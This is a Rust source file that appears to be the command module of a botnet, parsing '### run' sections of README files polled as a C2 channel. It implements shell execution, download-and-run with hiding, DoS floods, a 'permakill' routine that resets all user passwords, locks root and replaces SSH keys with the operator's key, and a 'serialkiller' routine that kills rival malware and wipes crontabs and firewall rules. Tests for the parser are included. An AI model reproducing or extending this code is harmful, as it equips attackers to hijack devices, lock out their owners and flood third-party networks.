//! FBI-NET Compatible C2 Operations
//!
//! Implements the FBI-NET C2 protocol alongside the ZW-encoding protocol.
//! Supports the `### run` README.md format with these command types:
//! - `cmd` — shell execution
//! - `download` — file download + optional execution
//! - `dos` — network flood
//! - `permakill` — credential lockdown
//! - `selfkill` — terminate self
//! - `serialkiller` — kill competitor malware processes

use serde::{Deserialize, Serialize};

// ── C2 Payload Types ────────────────────────────────────────────────────────

/// A parsed command from a `### run` section.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum FbiCommand {
    /// Execute a shell command
    Shell(String),
    /// Download a file with optional execution and hiding
    Download {
        url: String,
        dest: String,
        run: bool,
        hide: bool,
    },
    /// Network flood attack
    Dos {
        target: String,
        seconds: u64,
    },
    /// Change device credentials (permakill)
    Permakill {
        username: String,
        password: String,
    },
    /// Kill competitor malware
    SerialKiller {
        aggressive: bool,
    },
    /// Terminate self
    SelfKill,
    /// Add a fallback C2 repo
    AddRepo(String),
    /// Change poll interval
    SetInterval(u64),
    /// Sleep before next poll
    Sleep(u64),
    /// Display popup message
    PopMsg(String),
}

// ── Parsing ─────────────────────────────────────────────────────────────────

/// Parse a `### run` section from a README.md.
///
/// Format:
/// ```markdown
/// ### run
/// cmd echo hello
/// download http://x.com/a /tmp/a RUN HIDE
/// dos 10.0.0.1 30
/// permakill newuser newpass
/// serialkiller
/// selfkill
/// ```
pub fn parse_run_section(content: &str) -> Vec<FbiCommand> {
    let mut commands = Vec::new();

    // Find the `### run` section
    let run_start = match content.find("### run") {
        Some(pos) => pos,
        None => return commands,
    };

    let after_run = &content[run_start + 7..];

    // Extract lines until next `### ` heading or end
    let section_end = after_run
        .find("\n### ")
        .unwrap_or(after_run.len());

    let section = &after_run[..section_end];

    for line in section.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with("//") {
            continue;
        }

        if let Some(cmd) = parse_single_command(line) {
            commands.push(cmd);
        }
    }

    commands
}

/// Parse a single line into a command.
fn parse_single_command(line: &str) -> Option<FbiCommand> {
    let (action, args) = line.split_once(' ').unwrap_or((line, ""));
    let action = action.to_lowercase();
    let args = args.trim();

    match action.as_str() {
        "cmd" => Some(FbiCommand::Shell(args.to_string())),
        "shell" => Some(FbiCommand::Shell(args.to_string())),
        "download" => {
            let tokens: Vec<&str> = args.split_whitespace().collect();
            if tokens.len() < 2 {
                return None;
            }
            let url = tokens[0].to_string();
            let dest = tokens[1].to_string();
            let run = tokens.iter().any(|t| t.eq_ignore_ascii_case("RUN"));
            let hide = tokens.iter().any(|t| t.eq_ignore_ascii_case("HIDE"));
            Some(FbiCommand::Download { url, dest, run, hide })
        }
        "dos" => {
            let tokens: Vec<&str> = args.split_whitespace().collect();
            if tokens.len() < 2 {
                return None;
            }
            let target = tokens[0].to_string();
            let seconds = tokens[1].parse::<u64>().unwrap_or(30).min(300);
            Some(FbiCommand::Dos { target, seconds })
        }
        "permakill" => {
            let tokens: Vec<&str> = args.split_whitespace().collect();
            if tokens.len() < 2 {
                // Default lockout credentials
                Some(FbiCommand::Permakill {
                    username: "locked".into(),
                    password: "locked_out_1337".into(),
                })
            } else {
                Some(FbiCommand::Permakill {
                    username: tokens[0].to_string(),
                    password: tokens[1].to_string(),
                })
            }
        }
        "serialkiller" => {
            let aggressive = args.to_lowercase().contains("aggressive")
                || args.to_lowercase().contains("all");
            Some(FbiCommand::SerialKiller { aggressive })
        }
        "selfkill" => Some(FbiCommand::SelfKill),
        "add_repo" => {
            if args.is_empty() {
                None
            } else {
                Some(FbiCommand::AddRepo(args.to_string()))
            }
        }
        "set_interval" => {
            args.parse::<u64>().ok().map(|s| FbiCommand::SetInterval(s.max(10)))
        }
        "sleep" => {
            args.parse::<u64>().ok().map(|s| FbiCommand::Sleep(s.min(3600)))
        }
        "popmsg" => {
            if args.is_empty() {
                None
            } else {
                Some(FbiCommand::PopMsg(args.to_string()))
            }
        }
        _ => None,
    }
}

// ── Permakill ───────────────────────────────────────────────────────────────

/// Permakill: Replace device credentials to block re-infection.
///
/// This locks out other attackers by changing the device's login credentials.
/// Supports Telnet passwd, SSH authorized_keys rotation, and web admin panels.
pub struct Permakill;

impl Permakill {
    /// Generate commands to change telnet/SSH passwords.
    pub fn generate_telnet_lockout(username: &str, password: &str) -> Vec<String> {
        vec![
            format!("echo '{}:{}' | chpasswd 2>/dev/null", username, password),
            format!("passwd -l root 2>/dev/null || passwd {}", username),
        ]
    }

    /// Generate SSH key rotation commands.
    pub fn generate_ssh_lockout() -> Vec<String> {
        vec![
            "rm -f ~/.ssh/authorized_keys 2>/dev/null".into(),
            "rm -f /root/.ssh/authorized_keys 2>/dev/null".into(),
            "echo 'ssh-rsa AAAA...locked' > ~/.ssh/authorized_keys".into(),
            "chmod 600 ~/.ssh/authorized_keys 2>/dev/null".into(),
        ]
    }

    /// Generate full lockout script.
    pub fn generate_full_lockout(_username: &str, password: &str) -> String {
        format!(
            r#"
# Permakill — Credential Lockdown
echo '[!] Permakill executing...'

# Step 1: Change all user passwords
for user in $(cat /etc/passwd | grep -E '/bin/(sh|bash|ash)$' | cut -d: -f1); do
    echo "$user:{password}" | chpasswd 2>/dev/null
done

# Step 2: Lock root
passwd -l root 2>/dev/null

# Step 3: Remove all SSH authorized keys
find / -name authorized_keys -exec rm -f {{}} \; 2>/dev/null

# Step 4: Add our key only
mkdir -p ~/.ssh
echo 'ssh-rsa PERMAKILL_CONTROL_KEY' > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Step 5: Disable telnet if possible
killall telnetd 2>/dev/null
systemctl disable telnet 2>/dev/null

echo '[+] Permakill complete — device secured'
"#,
            password = password
        )
    }
}

// ── SerialKiller ────────────────────────────────────────────────────────────

/// SerialKiller: Eliminate competitor malware and botnets.
///
/// Identifies and terminates known malware processes, removes persistence
/// mechanisms left by other attackers, and cleans up common IoCs.
pub struct SerialKiller;

impl SerialKiller {
    /// Known malware process names to kill.
    pub fn known_malware_processes() -> &'static [&'static str] {
        &[
            "mirai", "qbot", "hajime", "brickerbot", "lightaidra",
            "gafgyt", "mozi", "tsunami", "dark_nexus", "fbot",
            "xorddos", "billgates", "kaiji", "freakout", "satori",
            "jenx", "masuta", "owari", "hoho", "bot",
            "zeus", "emotet", "trickbot", "dridex", "cobalt",
            "meterpreter", "beacon", "sliver", "havoc", "brute_ratel",
            "covenant", "empire", "merlin", "mythic", "nimplant",
            "khepri", "ares", "pupy", "quasar", "asyncrat",
            "njrat", "darkcomet", "orcus", "nanoCore", "remcos",
            "agenttesla", "formbook", "lokibot", "hawkeye", "predator",
        ]
    }

    /// Known malware ports.
    pub fn known_malware_ports() -> &'static [u16] {
        &[
            23, 2323, 5555, 7547, 37215, 52869, 48101,
            1337, 31337, 6667, 4444, 55555, 9999,
        ]
    }

    /// Generate process kill commands.
    pub fn generate_kill_commands(aggressive: bool) -> String {
        let processes = Self::known_malware_processes();
        let mut script = String::from(
            "# SerialKiller — Eliminating competitor malware\n",
        );

        for proc in processes {
            script.push_str(&format!(
                "killall -9 {} 2>/dev/null; pkill -f {} 2>/dev/null;\n",
                proc, proc
            ));
        }

        if aggressive {
            // Also clear suspicious cron jobs
            script.push_str(
                "crontab -r 2>/dev/null; \
                 rm -rf /tmp/*.sh /var/tmp/*.sh /dev/shm/* 2>/dev/null; \
                 iptables -F 2>/dev/null;\n",
            );
        }

        script.push_str("echo '[+] SerialKiller sweep complete'\n");
        script
    }

    /// Close known malware ports.
    pub fn generate_port_block_commands() -> String {
        let ports = Self::known_malware_ports();
        let mut script = String::from("# Blocking known malware ports\n");
        for &port in ports {
            script.push_str(&format!(
                "iptables -A INPUT -p tcp --dport {} -j DROP 2>/dev/null;\n",
                port
            ));
        }
        script
    }
}

// ── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_simple_run_section() {
        let content = "### run\ncmd whoami\nshell uname -a\n";
        let commands = parse_run_section(content);
        assert_eq!(commands.len(), 2);
        assert!(matches!(commands[0], FbiCommand::Shell(_)));
    }

    #[test]
    fn parse_download_with_flags() {
        let content = "### run\ndownload http://x.com/a /tmp/a RUN HIDE\n";
        let commands = parse_run_section(content);
        assert_eq!(commands.len(), 1);
        match &commands[0] {
            FbiCommand::Download { url, dest, run, hide } => {
                assert_eq!(url, "http://x.com/a");
                assert_eq!(dest, "/tmp/a");
                assert!(run);
                assert!(hide);
            }
            _ => panic!("Expected Download"),
        }
    }

    #[test]
    fn parse_dos() {
        let content = "### run\ndos 10.0.0.1 60\n";
        let commands = parse_run_section(content);
        assert_eq!(commands.len(), 1);
        match &commands[0] {
            FbiCommand::Dos { target, seconds } => {
                assert_eq!(target, "10.0.0.1");
                assert_eq!(*seconds, 60);
            }
            _ => panic!("Expected Dos"),
        }
    }

    #[test]
    fn parse_permakill() {
        let content = "### run\npermakill admin locked123\n";
        let commands = parse_run_section(content);
        assert_eq!(commands.len(), 1);
        match &commands[0] {
            FbiCommand::Permakill { username, password } => {
                assert_eq!(username, "admin");
                assert_eq!(password, "locked123");
            }
            _ => panic!("Expected Permakill"),
        }
    }

    #[test]
    fn parse_serialkiller_aggressive() {
        let content = "### run\nserialkiller aggressive\n";
        let commands = parse_run_section(content);
        assert_eq!(commands.len(), 1);
        match &commands[0] {
            FbiCommand::SerialKiller { aggressive } => {
                assert!(aggressive);
            }
            _ => panic!("Expected SerialKiller"),
        }
    }

    #[test]
    fn parse_selfkill() {
        let content = "### run\nselfkill\n";
        let commands = parse_run_section(content);
        assert_eq!(commands.len(), 1);
        assert!(matches!(commands[0], FbiCommand::SelfKill));
    }

    #[test]
    fn parse_multiple_commands() {
        let content = "### run\ncmd whoami\nsleep 30\npopmsg Hello, world!\nselfkill\n";
        let commands = parse_run_section(content);
        assert_eq!(commands.len(), 4);
    }

    #[test]
    fn parse_empty_run() {
        let content = "### run\n\n### other\nstuff\n";
        let commands = parse_run_section(content);
        assert_eq!(commands.len(), 0);
    }

    #[test]
    fn parse_no_run_section() {
        let content = "# Just a normal README\n\nNo commands here.\n";
        let commands = parse_run_section(content);
        assert_eq!(commands.len(), 0);
    }

    #[test]
    fn permakill_generates_lockout() {
        let cmds = Permakill::generate_telnet_lockout("admin", "secret");
        assert!(!cmds.is_empty());
        assert!(cmds[0].contains("chpasswd"));
    }

    #[test]
    fn serialkiller_has_targets() {
        let procs = SerialKiller::known_malware_processes();
        assert!(procs.contains(&"mirai"));
        let cmd = SerialKiller::generate_kill_commands(false);
        assert!(cmd.contains("mirai"));
        assert!(cmd.contains("killall"));
    }
}
